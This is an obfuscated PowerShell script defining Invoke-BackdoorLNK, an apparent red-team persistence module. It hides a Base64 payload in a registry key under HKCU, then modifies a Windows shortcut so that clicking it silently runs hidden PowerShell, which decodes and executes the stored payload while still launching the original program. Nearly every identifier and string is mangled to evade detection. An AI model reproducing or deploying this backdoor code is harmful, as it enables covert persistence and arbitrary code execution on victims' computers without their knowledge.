&("{0}{1}{2}"-f 'Se','T-variA','blE') ('n3'+'bwV4') ( [tYPe]("{2}{4}{1}{3}{0}"-F 'NG','eXt.E','SYs','Ncodi','TEM.t')  ) ;  &("{2}{1}{0}"-f 'lE','rIaB','seT-VA') 7z4  ( [tYPe]("{2}{4}{0}{3}{1}" -F 'cONV','T','sySt','er','eM.'))  ; function IN`V`O`kE`-baCKDOORl`Nk {


    [CmdletBinding()] Param(
        [Parameter(VAlUefroMPIpElInE=${t`RUe}, manDAtOrY = ${t`RUe})]
        [ValidateScript({.("{2}{1}{0}" -f '-Path','t','Tes') -Path ${_} })]
        [String]
        ${L`Nk`PaTH},

        [String]
        ${ENCsCR`I`pt},

        [String]
        ${R`eg`PaTh} = ((("{6}{4}{11}{0}{10}{7}{3}{5}{1}{8}{9}{2}"-f 'cr','Ef','bug','wWindo','fwSoftware','ws','HKCU:E','f','w','de','osoftE','EfwMi')).("{1}{0}"-f 'e','RePLaC').Invoke('Efw','\')),

        [Switch]
        ${c`l`EanuP}
    )

    ${Re`gpAR`Ts} = ${RE`GP`AtH}.("{1}{0}" -f'it','spl').Invoke("\")
    ${pA`Th} = ${rEGp`A`RTs}[0..(${ReG`paR`Ts}."CO`Unt"-2)] -join "\"
    ${n`Ame} = ${rEG`pAR`Ts}[-1]


    ${O`BJ} = &("{0}{2}{1}"-f 'Ne','ct','w-Obje') -ComObject ("{2}{1}{0}"-f'ript.Shell','c','WS')
    ${l`NK} = ${O`BJ}.("{1}{3}{4}{2}{0}"-f'tcut','Cr','r','eate','Sho').Invoke(${L`NkpATh})

    
    ${t`ARg`Etpa`TH} = ${L`NK}."TAR`ge`TpatH"
    ${w`ORkiNGd`irEc`TOry} = ${l`Nk}."wOrKInGdiR`ec`TorY"
    ${IC`o`Nl`Oc`AtIon} = ${L`Nk}."Ico`NlOC`AtI`On"

    if(${clE`A`NUp}) {

        
        ${ORigI`N`A`LpaTH} = (${I`CONLo`Ca`Tion} -split ",")[0]

        ${L`Nk}."tarGE`T`PatH" = ${OrIgIN`Al`path}
        ${l`NK}."ar`gu`mENts" = ${nU`Ll}
        ${L`NK}."wiND`Ow`St`YlE" = 1
        ${l`NK}.("{1}{0}" -f'ave','S').Invoke()

        
        ${nU`lL} = &("{2}{1}{3}{0}" -f 'y','e-Item','Remov','Propert') -Force -Path ${p`Ath} -Name ${NA`me}
    }
    else {

        if(!${EnCS`cR`IPT} -or ${E`N`cSC`RIpt} -eq '') {
            throw ("{4}{2}{1}{0}{7}{6}{5}{3}"-f'lea',' or -C','EncScript','d!','-','quire','e','nup r')
        }

        
        ${N`ULL} = &("{0}{4}{1}{2}{3}"-f'Set-Ite','p','ert','y','mPro') -Force -Path ${P`AtH} -Name ${Na`me} -Value ${En`cScR`I`Pt}

        ('[*'+'] '+'B'+'64 '+'scr'+'ip'+'t '+'st'+'ored '+'at'+' '+"'$RegPath'`n")

        
        ${l`Nk}."taRg`ETP`Ath" = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"

        
        ${la`UNCH`st`RiNG} = (((("{2}{3}{4}{5}{1}{0}" -f 'L','cess]::Start(te','[System.Diagno','s','tics.P','ro'))-replAce  ([CHAr]116+[CHAr]101+[CHAr]76),[CHAr]34))+${Ta`R`GetP`AtH}+(((("{2}{7}{17}{16}{18}{4}{12}{15}{11}{0}{1}{19}{5}{3}{13}{6}{14}{10}{8}{9}"-f'CODE.GetString','(','{','onvert]::Fr','cod','C','mBase6','0});IEX (','(','gp ','tring(','UNI','ing]','o','4S','::','Text','[','.En','['))  -f[cHAr]34))+${PA`TH}+' '+${NA`Me}+').'+${NA`mE}+')))'

        ${LaU`N`chbYtES}  =  (  .("{2}{1}{0}{3}" -f 'RIa','a','get-V','BlE')  ('n3'+'bWV4')  )."V`ALue"::"u`NIC`ODE".("{2}{0}{1}" -f'te','s','GetBy').Invoke(${lAuNc`hstr`ING})
        ${l`A`UnChB64} =   ( .('lS') vaRiABLe:7z4 )."V`AluE"::"to`BasE64`st`RINg"(${LaUnChb`Y`Tes})

        ${l`Nk}."a`RG`UMeNtS" = ('-'+'w '+'h'+'idden'+' '+'-n'+'op '+'-enc'+' '+"$LaunchB64")

        
        ${l`Nk}."w`OrkINGDIR`eC`To`RY" = ${wo`RkiN`Gdi`RECTORy}
        ${L`Nk}."iConloc`A`TI`on" = "$TargetPath,0"
        ${l`NK}."winD`OwS`TYLE" = 7
        ${L`Nk}.("{1}{0}" -f 'ave','S').Invoke()

        ('[*]'+' '+'.'+'LNK '+'at'+' '+"$LNKPath "+'set'+' '+'t'+'o '+"trigger`n")
    }
}